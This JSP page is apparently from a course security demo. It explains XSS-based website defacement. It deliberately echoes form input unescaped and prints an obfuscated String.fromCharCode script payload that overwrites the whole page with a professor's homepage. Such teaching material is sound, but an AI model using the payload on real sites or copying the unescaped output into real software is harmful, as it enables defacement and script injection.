<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Defacement Demonstration</title>
<jsp:include page="_resources.jsp"></jsp:include>
</head>
<body class="fixed-nav sticky-footer bg-dark">
	<jsp:include page="_header.jsp"></jsp:include>
	<div class="content-wrapper">
		<div class="container-fluid">
			<div class="card mx-5">
				<div class="card-header h3">Defacement Demonstration</div>
				<div class="card-body">
					<div class="form-group">
						<div class="form-row">
							<div class="col-12">
								<p>Defacement is a process in which the attacker completely
									changes the way a website looks. There are many approaches how
									to achieve it. Here, I will demonstrate a simple way to deface
									a website (this page) using XSS attack.</p>

								<p>Just like in an XSS attack, a defacer can use a script to
									force the server to behave unexpectedly. If client-submitted
									requests are not escaped or stripped of scripts, they can
									become very troublesome. I will demonstrate how to deface this
									page temporarily (it will restore on refresh), but that is
									because I am dynamically displaying user input. If the user
									input was stored in a database, let&#39;s say as a comment to a
									blog post, and that comment contained the defacing script, the
									page would remain defaced until the comment is removed or is no
									longer being loaded.</p>

								<p>
									Assuming that the form below is a user submission form for a
									comment that is not being checked for scripts, a user could
									easily force the comment to overwrite the entire look of the
									website. I have obtained the source code of Professor
									Stamp&#39;s homepage for CS 166 from&nbsp;<a
										href="http://www.cs.sjsu.edu/~stamp/">http://www.cs.sjsu.edu/~stamp/</a>.
									After that, I have converted the source code into their
									character code representation, which I then recompiled into a
									string object to be passed to the form. If the code below is
									copied into the field and saved, this page will turn into
									Professor Stamp&#39;s homepage, minus the cover photo (which is
									being stored internally). This demo does not work on Google
									Chrome because of the XSS Auditor, but as of 12/17/2017 it
									still works on Mozilla Firefox and Internet Edge.
								</p>

								<form action="${pageContext.request.contextPath}/defacedemo"
									method="POST">
									<div class="form-group">
										<div class="form-row">
											<div class="col-md-4">
												<input class="form-control" id="scriptOne" type="text"
													name="scriptOne" />
											</div>
											<div class="col-md-4">
												<input class="btn btn-success" value="Show" id="submit"
													type="submit" name="submit" />
											</div>

										</div>
									</div>
								</form>
								<div class="col-md-4">${outputOne}</div>

								<p>&nbsp;</p>

								<p>
									<code>&lt;script&gt;document.documentElement.innerHTML=String.fromCharCode(10,
										60, 33, 68, 79, 67, 84, 89, 80, 69, 32, 72, 84, 77, 76, 32,
										80, 85, 66, 76, 73, 67, 32, 34, 45, 47, 47, 87, 51, 67, 47,
										47, 68, 84, 68, 32, 72, 84, 77, 76, 32, 51, 47, 47, 69, 78,
										34, 62, 10, 60, 72, 84, 77, 76, 62, 10, 60, 72, 69, 65, 68,
										62, 10, 60, 84, 73, 84, 76, 69, 62, 10, 32, 32, 77, 97, 114,
										107, 32, 83, 116, 97, 109, 112, 39, 115, 32, 83, 74, 83, 85,
										32, 102, 97, 99, 117, 108, 116, 121, 32, 112, 97, 103, 101,
										10, 60, 47, 84, 73, 84, 76, 69, 62, 10, 60, 109, 101, 116, 97,
										32, 110, 97, 109, 101, 61, 34, 107, 101, 121, 119, 111, 114,
										100, 115, 34, 32, 99, 111, 110, 116, 101, 110, 116, 61, 34,
										109, 97, 114, 107, 32, 115, 116, 97, 109, 112, 44, 32, 109,
										97, 114, 107, 32, 115, 46, 32, 115, 116, 97, 109, 112, 44, 32,
										109, 97, 114, 107, 32, 115, 116, 101, 118, 101, 110, 32, 115,
										116, 97, 109, 112, 34, 62, 10, 60, 109, 101, 116, 97, 32, 110,
										97, 109, 101, 61, 34, 100, 101, 115, 99, 114, 105, 112, 116,
										105, 111, 110, 34, 32, 99, 111, 110, 116, 101, 110, 116, 61,
										34, 77, 97, 114, 107, 32, 83, 116, 97, 109, 112, 39, 115, 32,
										83, 74, 83, 85, 32, 102, 97, 99, 117, 108, 116, 121, 32, 119,
										101, 98, 32, 112, 97, 103, 101, 34, 62, 10, 60, 47, 72, 69,
										65, 68, 62, 10, 60, 66, 79, 68, 89, 62, 10, 60, 102, 111, 110,
										116, 32, 102, 97, 99, 101, 61, 34, 67, 111, 109, 105, 99, 32,
										83, 97, 110, 115, 32, 77, 83, 34, 62, 10, 10, 60, 80, 62, 10,
										32, 32, 60, 99, 101, 110, 116, 101, 114, 62, 10, 32, 32, 32,
										32, 60, 73, 77, 71, 32, 83, 82, 67, 61, 34, 114, 97, 105, 110,
										95, 108, 105, 110, 46, 103, 105, 102, 34, 32, 119, 105, 100,
										116, 104, 61, 34, 53, 52, 48, 34, 32, 104, 101, 105, 103, 104,
										116, 61, 34, 52, 34, 62, 10, 32, 32, 60, 47, 99, 101, 110,
										116, 101, 114, 62, 10, 60, 47, 80, 62, 10, 10, 60, 72, 49, 62,
										10, 32, 32, 60, 99, 101, 110, 116, 101, 114, 62, 10, 32, 32,
										32, 32, 32, 32, 77, 97, 114, 107, 32, 83, 116, 97, 109, 112,
										10, 32, 32, 60, 47, 99, 101, 110, 116, 101, 114, 62, 10, 60,
										47, 72, 49, 62, 10, 10, 60, 80, 62, 10, 32, 32, 60, 99, 101,
										110, 116, 101, 114, 62, 10, 32, 32, 32, 32, 60, 73, 77, 71,
										32, 83, 82, 67, 61, 34, 114, 97, 105, 110, 95, 108, 105, 110,
										46, 103, 105, 102, 34, 32, 119, 105, 100, 116, 104, 61, 34,
										53, 52, 48, 34, 32, 104, 101, 105, 103, 104, 116, 61, 34, 52,
										34, 62, 10, 32, 32, 60, 47, 99, 101, 110, 116, 101, 114, 62,
										10, 60, 47, 80, 62, 10, 10, 10, 60, 99, 101, 110, 116, 101,
										114, 62, 60, 73, 77, 71, 32, 83, 82, 67, 61, 34, 115, 104, 97,
										114, 107, 46, 106, 112, 103, 34, 32, 104, 115, 112, 97, 99,
										101, 61, 34, 49, 48, 34, 32, 118, 115, 112, 97, 99, 101, 61,
										34, 49, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 55, 48,
										52, 34, 32, 104, 101, 105, 103, 104, 116, 61, 34, 53, 50, 56,
										34, 62, 60, 47, 99, 101, 110, 116, 101, 114, 62, 10, 10, 60,
										117, 108, 62, 10, 10, 60, 112, 62, 10, 60, 108, 105, 62, 60,
										98, 62, 32, 70, 97, 108, 108, 32, 50, 48, 49, 55, 60, 47, 98,
										62, 58, 60, 98, 114, 62, 10, 60, 117, 108, 62, 10, 60, 108,
										105, 62, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 67, 83,
										50, 56, 54, 47, 115, 121, 108, 108, 97, 98, 117, 115, 47, 115,
										121, 108, 108, 97, 98, 117, 115, 70, 97, 108, 108, 49, 55, 46,
										104, 116, 109, 108, 34, 62, 67, 83, 32, 50, 56, 54, 60, 47,
										97, 62, 32, 10, 84, 111, 112, 105, 99, 115, 32, 105, 110, 32,
										77, 97, 99, 104, 105, 110, 101, 32, 76, 101, 97, 114, 110,
										105, 110, 103, 10, 60, 47, 117, 108, 62, 10, 60, 47, 112, 62,
										10, 10, 60, 112, 62, 10, 60, 108, 105, 62, 32, 87, 104, 97,
										116, 32, 107, 105, 110, 100, 115, 32, 111, 102, 32, 112, 114,
										111, 106, 101, 99, 116, 115, 32, 100, 111, 32, 109, 121, 32,
										115, 116, 117, 100, 101, 110, 116, 115, 32, 100, 111, 63, 32,
										73, 39, 109, 32, 103, 108, 97, 100, 10, 121, 111, 117, 32, 97,
										115, 107, 101, 100, 46, 32, 77, 111, 115, 116, 32, 111, 102,
										32, 109, 121, 32, 115, 116, 117, 100, 101, 110, 116, 115, 32,
										100, 111, 32, 115, 101, 99, 117, 114, 105, 116, 121, 45, 114,
										101, 108, 97, 116, 101, 100, 32, 112, 114, 111, 106, 101, 99,
										116, 115, 32, 10, 97, 110, 100, 32, 116, 104, 101, 114, 101,
										32, 97, 114, 101, 32, 116, 111, 110, 115, 32, 111, 102, 32,
										103, 111, 111, 100, 32, 112, 114, 111, 106, 101, 99, 116, 32,
										116, 111, 112, 105, 99, 115, 32, 105, 110, 32, 115, 101, 99,
										117, 114, 105, 116, 121, 46, 10, 60, 117, 108, 62, 10, 60,
										108, 105, 62, 32, 77, 97, 115, 116, 101, 114, 115, 32, 115,
										116, 117, 100, 101, 110, 116, 32, 112, 114, 111, 106, 101, 99,
										116, 115, 32, 40, 116, 105, 116, 108, 101, 115, 32, 97, 110,
										100, 32, 99, 111, 109, 112, 108, 101, 116, 101, 100, 32, 114,
										101, 112, 111, 114, 116, 115, 41, 10, 99, 97, 110, 32, 98,
										101, 32, 102, 111, 117, 110, 100, 10, 60, 97, 32, 104, 114,
										101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119,
										119, 46, 99, 115, 46, 115, 106, 115, 117, 46, 101, 100, 117,
										47, 126, 115, 116, 97, 109, 112, 47, 99, 118, 47, 109, 115,
										115, 46, 104, 116, 109, 108, 35, 109, 97, 115, 116, 101, 114,
										115, 34, 62, 104, 101, 114, 101, 60, 47, 97, 62, 46, 10, 60,
										108, 105, 62, 32, 85, 110, 100, 101, 114, 103, 114, 97, 100,
										117, 97, 116, 101, 32, 112, 114, 111, 106, 101, 99, 116, 115,
										32, 97, 114, 101, 32, 103, 105, 118, 101, 110, 10, 60, 97, 32,
										104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47,
										119, 119, 119, 46, 99, 115, 46, 115, 106, 115, 117, 46, 101,
										100, 117, 47, 126, 115, 116, 97, 109, 112, 47, 99, 118, 47,
										109, 115, 115, 46, 104, 116, 109, 108, 35, 117, 110, 100, 101,
										114, 103, 114, 97, 100, 34, 62, 104, 101, 114, 101, 60, 47,
										97, 62, 46, 10, 60, 47, 117, 108, 62, 10, 60, 47, 112, 62, 10,
										10, 60, 112, 62, 10, 60, 108, 105, 62, 32, 87, 104, 97, 116,
										32, 107, 105, 110, 100, 32, 111, 102, 32, 116, 101, 97, 99,
										104, 101, 114, 32, 97, 109, 32, 73, 63, 32, 73, 39, 118, 101,
										32, 112, 111, 115, 116, 101, 100, 32, 10, 60, 97, 32, 104,
										114, 101, 102, 61, 34, 101, 118, 97, 108, 115, 46, 104, 116,
										109, 108, 34, 62, 115, 101, 108, 101, 99, 116, 101, 100, 32,
										115, 116, 117, 100, 101, 110, 116, 32, 99, 111, 109, 109, 101,
										110, 116, 115, 60, 47, 97, 62, 32, 102, 114, 111, 109, 10,
										109, 121, 32, 116, 101, 97, 99, 104, 105, 110, 103, 32, 101,
										118, 97, 108, 117, 97, 116, 105, 111, 110, 115, 46, 32, 79,
										102, 32, 99, 111, 117, 114, 115, 101, 44, 32, 121, 111, 117,
										32, 99, 97, 110, 32, 97, 108, 115, 111, 32, 99, 104, 101, 99,
										107, 10, 111, 117, 116, 32, 109, 121, 32, 114, 101, 118, 105,
										101, 119, 115, 32, 97, 116, 32, 77, 121, 95, 80, 114, 111,
										102, 101, 115, 115, 111, 114, 95, 73, 115, 95, 65, 95, 74,
										101, 114, 107, 46, 99, 111, 109, 32, 40, 111, 114, 32, 115,
										111, 109, 101, 116, 104, 105, 110, 103, 32, 108, 105, 107,
										101, 32, 116, 104, 97, 116, 41, 46, 10, 80, 101, 114, 115,
										111, 110, 97, 108, 108, 121, 44, 32, 73, 32, 110, 101, 118,
										101, 114, 32, 108, 111, 111, 107, 32, 97, 116, 32, 116, 104,
										111, 115, 101, 32, 107, 105, 110, 100, 115, 32, 111, 102, 32,
										115, 105, 116, 101, 115, 44, 10, 102, 111, 114, 32, 102, 101,
										97, 114, 32, 111, 102, 32, 119, 104, 97, 116, 32, 73, 32, 109,
										105, 103, 104, 116, 32, 102, 105, 110, 100, 46, 10, 60, 47,
										112, 62, 10, 10, 60, 112, 62, 10, 60, 108, 105, 62, 32, 76,
										105, 110, 107, 115, 32, 116, 111, 32, 109, 97, 110, 121, 32,
										111, 102, 32, 116, 104, 101, 32, 112, 97, 112, 101, 114, 115,
										32, 116, 104, 97, 116, 32, 73, 39, 118, 101, 32, 119, 114,
										105, 116, 116, 101, 110, 32, 97, 114, 101, 32, 10, 60, 97, 32,
										104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47,
										119, 119, 119, 46, 99, 115, 46, 115, 106, 115, 117, 46, 101,
										100, 117, 47, 126, 115, 116, 97, 109, 112, 47, 99, 118, 47,
										109, 115, 115, 46, 104, 116, 109, 108, 35, 112, 117, 98, 115,
										34, 62, 104, 101, 114, 101, 60, 47, 97, 62, 46, 10, 84, 104,
										101, 32, 71, 111, 111, 103, 108, 101, 32, 83, 99, 104, 111,
										108, 97, 114, 32, 115, 117, 109, 109, 97, 114, 121, 32, 111,
										102, 32, 99, 105, 116, 97, 116, 105, 111, 110, 115, 32, 111,
										102, 32, 109, 121, 32, 97, 114, 116, 105, 99, 108, 101, 115,
										32, 99, 97, 110, 32, 98, 101, 32, 102, 111, 117, 110, 100, 10,
										60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112,
										58, 47, 47, 115, 99, 104, 111, 108, 97, 114, 46, 103, 111,
										111, 103, 108, 101, 46, 99, 111, 109, 47, 99, 105, 116, 97,
										116, 105, 111, 110, 115, 63, 117, 115, 101, 114, 61, 119, 56,
										103, 117, 67, 106, 73, 65, 65, 65, 65, 74, 34, 62, 104, 101,
										114, 101, 60, 47, 97, 62, 46, 32, 10, 77, 105, 99, 114, 111,
										115, 111, 102, 116, 32, 65, 99, 97, 100, 101, 109, 105, 99,
										32, 112, 114, 111, 118, 105, 100, 101, 115, 32, 115, 105, 109,
										105, 108, 97, 114, 32, 40, 97, 108, 116, 104, 111, 117, 103,
										104, 44, 32, 115, 116, 114, 97, 110, 103, 101, 108, 121, 44,
										32, 109, 117, 99, 104, 32, 108, 101, 115, 115, 32, 99, 111,
										109, 112, 108, 101, 116, 101, 41, 32, 10, 105, 110, 102, 111,
										114, 109, 97, 116, 105, 111, 110, 32, 60, 97, 32, 104, 114,
										101, 102, 61, 34, 104, 116, 116, 112, 115, 58, 47, 47, 97, 99,
										97, 100, 101, 109, 105, 99, 46, 109, 105, 99, 114, 111, 115,
										111, 102, 116, 46, 99, 111, 109, 47, 35, 47, 115, 101, 97,
										114, 99, 104, 63, 105, 113, 61, 67, 111, 109, 112, 111, 115,
										105, 116, 101, 40, 65, 65, 46, 65, 117, 78, 37, 50, 53, 51,
										68, 37, 50, 53, 51, 68, 39, 109, 97, 114, 107, 37, 50, 53, 50,
										48, 115, 116, 97, 109, 112, 39, 41, 38, 113, 61, 109, 97, 114,
										107, 37, 50, 48, 115, 116, 97, 109, 112, 38, 102, 105, 108,
										116, 101, 114, 115, 61, 38, 102, 114, 111, 109, 61, 48, 38,
										115, 111, 114, 116, 61, 48, 34, 62, 104, 101, 114, 101, 60,
										47, 97, 62, 44, 10, 97, 110, 100, 32, 116, 104, 101, 32, 34,
										83, 101, 109, 97, 110, 116, 105, 99, 32, 83, 99, 104, 111,
										108, 97, 114, 34, 32, 118, 101, 114, 115, 105, 111, 110, 32,
										105, 115, 32, 97, 118, 97, 105, 108, 97, 98, 108, 101, 10, 60,
										97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 115,
										58, 47, 47, 119, 119, 119, 46, 115, 101, 109, 97, 110, 116,
										105, 99, 115, 99, 104, 111, 108, 97, 114, 46, 111, 114, 103,
										47, 115, 101, 97, 114, 99, 104, 63, 113, 61, 77, 97, 114, 107,
										37, 50, 48, 83, 116, 97, 109, 112, 38, 115, 111, 114, 116, 61,
										114, 101, 108, 101, 118, 97, 110, 99, 101, 38, 97, 101, 61,
										102, 97, 108, 115, 101, 34, 62, 104, 101, 114, 101, 60, 47,
										97, 62, 46, 10, 60, 47, 112, 62, 10, 10, 60, 112, 62, 10, 60,
										108, 105, 62, 32, 73, 39, 118, 101, 32, 112, 117, 116, 32,
										116, 111, 103, 101, 116, 104, 101, 114, 10, 60, 97, 32, 104,
										114, 101, 102, 61, 34, 115, 101, 99, 117, 114, 105, 116, 121,
										74, 111, 117, 114, 110, 97, 108, 115, 46, 104, 116, 109, 108,
										34, 62, 116, 104, 105, 115, 32, 108, 105, 115, 116, 60, 47,
										97, 62, 10, 111, 102, 32, 105, 110, 102, 111, 114, 109, 97,
										116, 105, 111, 110, 32, 115, 101, 99, 117, 114, 105, 116, 121,
										32, 106, 111, 117, 114, 110, 97, 108, 115, 44, 32, 119, 105,
										116, 104, 32, 97, 32, 98, 114, 105, 101, 102, 32, 99, 111,
										109, 109, 101, 110, 116, 32, 111, 110, 32, 101, 97, 99, 104,
										46, 10, 60, 47, 112, 62, 10, 10, 60, 112, 62, 10, 60, 108,
										105, 62, 32, 73, 32, 119, 97, 115, 32, 105, 110, 116, 101,
										114, 118, 105, 101, 119, 101, 100, 32, 97, 98, 111, 117, 116,
										32, 109, 121, 32, 109, 97, 108, 119, 97, 114, 101, 45, 114,
										101, 108, 97, 116, 101, 100, 32, 114, 101, 115, 101, 97, 114,
										99, 104, 32, 10, 98, 121, 32, 116, 104, 101, 32, 101, 100,
										105, 116, 111, 114, 32, 111, 102, 32, 97, 32, 104, 97, 99,
										107, 101, 114, 115, 39, 32, 111, 110, 108, 105, 110, 101, 32,
										101, 45, 122, 105, 110, 101, 46, 32, 84, 104, 105, 115, 32,
										115, 99, 105, 110, 116, 105, 108, 108, 97, 116, 105, 110, 103,
										44, 32, 10, 116, 101, 108, 108, 45, 97, 108, 108, 32, 105,
										110, 116, 101, 114, 118, 105, 101, 119, 32, 99, 97, 110, 32,
										98, 101, 32, 102, 111, 117, 110, 100, 32, 97, 116, 32, 10, 60,
										97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58,
										47, 47, 115, 112, 116, 104, 46, 118, 105, 114, 105, 105, 46,
										108, 117, 47, 105, 110, 116, 77, 97, 114, 107, 83, 116, 97,
										109, 112, 46, 116, 120, 116, 34, 62, 104, 116, 116, 112, 58,
										47, 47, 115, 112, 116, 104, 46, 118, 105, 114, 105, 105, 46,
										108, 117, 47, 105, 110, 116, 77, 97, 114, 107, 83, 116, 97,
										109, 112, 46, 116, 120, 116, 60, 47, 97, 62, 32, 10, 40, 116,
										104, 101, 32, 108, 105, 110, 107, 32, 116, 111, 32, 116, 104,
										101, 32, 99, 111, 109, 112, 108, 101, 116, 101, 32, 105, 115,
										115, 117, 101, 32, 105, 115, 10, 60, 97, 32, 104, 114, 101,
										102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 115, 112, 116,
										104, 46, 118, 105, 114, 105, 105, 46, 108, 117, 47, 109, 97,
										105, 110, 46, 104, 116, 109, 34, 62, 104, 116, 116, 112, 58,
										47, 47, 115, 112, 116, 104, 46, 118, 105, 114, 105, 105, 46,
										108, 117, 47, 109, 97, 105, 110, 46, 104, 116, 109, 60, 47,
										97, 62, 41, 46, 10, 60, 47, 112, 62, 10, 10, 60, 112, 62, 10,
										60, 108, 105, 62, 32, 77, 121, 32, 100, 101, 116, 97, 105,
										108, 101, 100, 32, 99, 118, 32, 99, 97, 110, 32, 98, 101, 32,
										102, 111, 117, 110, 100, 10, 60, 97, 32, 104, 114, 101, 102,
										61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 99,
										115, 46, 115, 106, 115, 117, 46, 101, 100, 117, 47, 126, 115,
										116, 97, 109, 112, 47, 99, 118, 47, 109, 115, 115, 46, 104,
										116, 109, 108, 34, 62, 104, 101, 114, 101, 60, 47, 97, 62, 46,
										10, 60, 47, 112, 62, 10, 10, 60, 112, 62, 10, 60, 108, 105,
										62, 32, 89, 101, 115, 44, 32, 73, 32, 100, 111, 32, 104, 97,
										118, 101, 32, 97, 32, 108, 105, 102, 101, 32, 40, 119, 101,
										108, 108, 44, 32, 115, 111, 114, 116, 32, 111, 102, 46, 46,
										46, 41, 46, 32, 10, 65, 32, 102, 101, 119, 32, 114, 101, 108,
										97, 116, 105, 118, 101, 108, 121, 32, 114, 101, 99, 101, 110,
										116, 32, 112, 104, 111, 116, 111, 115, 32, 99, 97, 110, 32,
										98, 101, 32, 102, 111, 117, 110, 100, 10, 60, 97, 32, 104,
										114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119,
										119, 119, 46, 99, 115, 46, 115, 106, 115, 117, 46, 101, 100,
										117, 47, 126, 115, 116, 97, 109, 112, 47, 112, 104, 111, 116,
										111, 115, 47, 50, 48, 49, 54, 47, 112, 104, 111, 116, 111,
										115, 46, 104, 116, 109, 108, 34, 62, 104, 101, 114, 101, 60,
										47, 97, 62, 46, 10, 60, 47, 112, 62, 10, 10, 60, 112, 62, 10,
										60, 108, 105, 62, 32, 84, 104, 101, 32, 98, 101, 115, 116, 32,
										119, 97, 121, 32, 116, 111, 32, 99, 111, 110, 116, 97, 99,
										116, 32, 109, 101, 32, 105, 115, 32, 118, 105, 97, 32, 10, 60,
										97, 32, 104, 114, 101, 102, 61, 34, 109, 97, 105, 108, 116,
										111, 58, 109, 97, 114, 107, 46, 115, 116, 97, 109, 112, 64,
										115, 106, 115, 117, 46, 101, 100, 117, 34, 62, 101, 109, 97,
										105, 108, 60, 47, 97, 62, 46, 32, 10, 73, 102, 32, 121, 111,
										117, 32, 97, 114, 101, 32, 108, 111, 99, 97, 108, 44, 32, 102,
										101, 101, 108, 32, 102, 114, 101, 101, 32, 116, 111, 32, 115,
										116, 111, 112, 32, 98, 121, 32, 100, 117, 114, 105, 110, 103,
										32, 109, 121, 32, 111, 102, 102, 105, 99, 101, 32, 104, 111,
										117, 114, 115, 32, 10, 116, 111, 32, 99, 104, 97, 116, 46, 10,
										60, 47, 112, 62, 10, 10, 60, 47, 117, 108, 62, 10, 10, 60, 98,
										114, 62, 10, 10, 60, 72, 82, 62, 10, 10, 60, 98, 114, 62, 10,
										10, 60, 65, 68, 68, 82, 69, 83, 83, 62, 60, 83, 84, 82, 79,
										78, 71, 62, 66, 114, 111, 117, 103, 104, 116, 32, 116, 111,
										32, 121, 111, 117, 32, 98, 121, 32, 77, 97, 114, 107, 32, 83,
										116, 97, 109, 112, 44, 32, 10, 60, 97, 32, 104, 114, 101, 102,
										61, 34, 110, 117, 109, 98, 101, 114, 56, 53, 46, 104, 116,
										109, 108, 34, 62, 78, 117, 109, 98, 101, 114, 32, 56, 53, 60,
										47, 97, 62, 60, 47, 83, 84, 82, 79, 78, 71, 62, 60, 66, 82,
										62, 10, 69, 45, 77, 97, 105, 108, 58, 32, 60, 65, 32, 72, 82,
										69, 70, 61, 34, 109, 97, 105, 108, 116, 111, 58, 109, 97, 114,
										107, 46, 115, 116, 97, 109, 112, 64, 115, 106, 115, 117, 46,
										101, 100, 117, 34, 62, 109, 97, 114, 107, 46, 115, 116, 97,
										109, 112, 64, 115, 106, 115, 117, 46, 101, 100, 117, 60, 47,
										65, 62, 60, 66, 82, 62, 10, 76, 97, 115, 116, 32, 77, 111,
										100, 105, 102, 105, 101, 100, 58, 32, 65, 117, 103, 117, 115,
										116, 32, 49, 51, 44, 32, 50, 48, 49, 55, 46, 10, 60, 47, 65,
										68, 68, 82, 69, 83, 83, 62, 10, 10, 60, 47, 102, 111, 110,
										116, 62, 10, 60, 47, 66, 79, 68, 89, 62, 10, 60, 47, 72, 84,
										77, 76, 62)&lt;/script&gt;</code>
								</p>

							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<jsp:include page="_footer.jsp"></jsp:include>
</body>
</html>